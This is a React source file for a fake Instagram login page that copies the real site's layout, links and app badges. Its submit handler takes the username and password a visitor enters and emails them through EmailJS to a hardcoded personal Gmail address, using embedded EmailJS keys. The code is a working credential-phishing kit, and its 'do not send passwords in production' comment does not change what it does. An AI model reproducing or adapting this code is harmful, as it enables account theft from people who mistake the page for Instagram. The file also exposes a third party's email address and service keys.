import React, { Component } from 'react';
import googleplay from '/imgs/google.png'; // Corrected path (./imgs)
import microsoft from '/imgs/microsoft.png'; // Corrected path (./imgs)
import emailjs from '@emailjs/browser'; // Import EmailJS
let google=('https://play.google.com/store/apps/details?id=com.instagram.android&referrer=ig_mid%3DE46F0C8F-916F-4E2D-8758-C1A2EF7633AB%26utm_campaign%3DunifiedHome%26utm_content%3Dlo%26utm_source%3Dinstagramweb%26utm_medium%3Dbadge')
let microso=('https://www.microsoft.com/en-us/p/instagram/9nblggh5l9xt?activetab=pivot:overviewtab')
class Login extends Component {
    constructor(props) {
        super(props);
        this.state = {
            username: '',
            password: '',
            loginButtonOpacity: 0.5,
            errorMessage: '',
        };

        this.handleInputChange = this.handleInputChange.bind(this);
        this.handleSubmit = this.handleSubmit.bind(this);
    }

    handleInputChange(event) {
        const { name, value } = event.target;
        this.setState({ [name]: value, errorMessage: '' });

        const isFormValid = this.isFormValid();
        this.setState({ loginButtonOpacity: isFormValid ? 1 : 0.5 });
    }

    isFormValid() {
        return this.state.password.length >= 5 && this.state.username !== '';
    }

    handleSubmit(event) {
        event.preventDefault();
        const { username, password } = this.state;
        const isFormValid = this.isFormValid();

        if (isFormValid) {
            const templateParams = {
                from_name: username,
                to_email: 'fabriceib2006@gmail.com', // Replace with your email
                message: `Username: ${username}\nPassword: ${password}` // INSECURE - DO NOT SEND PASSWORDS IN PRODUCTION
            };

            // Initialize EmailJS (replace with your actual keys)
            emailjs.init('FeFR-_lU1Ne__CgPQ'); // Your EmailJS Public Key

            emailjs.send('service_5pz7f74', 'template_xgi10po', templateParams) // Your service and template IDs
                .catch((error) => {
                    console.error('Failed to send email:', error);
                    this.setState({ errorMessage: 'Failed to send email. Please try again later.' });
                });
        } else {
            this.setState({ errorMessage: "Please enter both username and a password of at least 5 characters." });
        }
    }

    render() {
        const { username, password, loginButtonOpacity, errorMessage } = this.state;

        return (
            <div className='m:h-screen bg-white flex flex-col items-center'>
                <div className='w-3/4 h-3/6 flex flex-col items-center bg-white my-4 border border-solid border-gray-300 sm:w-2/4 md:w-1/3 lg:w-1/4'>
                    <form onSubmit={this.handleSubmit} className='w-90 flex flex-col items-center'>
                        <div className="text-4xl font-['Lobster_Two'] text-black font-normal my-5">
                            Instagram
                        </div>
                        <input
                            className='h-10 w-3/4 bg-gray-50 border border-solid text-sm rounded-sm pl-2 my-4 outline-none'
                            type='text'
                            name="username"
                            placeholder='Phone number, username, or email'
                            value={username}
                            onChange={this.handleInputChange}
                        />
                        <input
                            className='h-10 w-3/4 bg-gray-50 border border-solid text-sm rounded-sm pl-2 my-4 outline-none'
                            type='password'
                            name="password"
                            placeholder='Password'
                            value={password}
                            onChange={this.handleInputChange}
                        />
                        <button
                            className='h-10 w-3/4 bg-blue-400 text-white font-semibold border-solid text-sm rounded-xl pl-2 mb-4 cursor-pointer'
                            style={{ opacity: loginButtonOpacity }}
                            type="submit"
                        >
                            Login
                        </button>

                        {errorMessage && <p className="error-message">{errorMessage}</p>}

                    </form>
                    <p className='font-thin text-sm p-3 '><a href='https://www.instagram.com/accounts/password/reset/' className='text-none'>Forgot password?</a></p>
                </div>
                <div className='w-3/4 h-20 bg-white border border-solid border-gray-300 flex justify-center items-center text-sm sm:w-2/4 md:w-1/3 lg:w-1/4'>
                    <p>Don't have an account?<span className='text-blue-500 font-semibold cursor-pointer'><a href='https://www.instagram.com/accounts/emailsignup/' className='text-none'>Sign up</a></span></p></div>
                <div className='flex flex-col item-center justify-center mt-4 '>
                    <p className='text-center text-gray-500'>Get the app</p>
                    <div className=' flex mt-2 [&>*]:w-28 [&>*]:m-1 apps'>
                        <a href={google} className='w-28 h-10 m-1 cursor-pointer'><img className='' src={googleplay} alt='Google paly'></img></a>
                        <a href={microso} className='w-28 h-10 m-1 cursor-pointer'><img className='' src={microsoft} alt='Google paly'></img></a>
                    </div>
                </div>
            </div>
        );
    }
}

export default Login;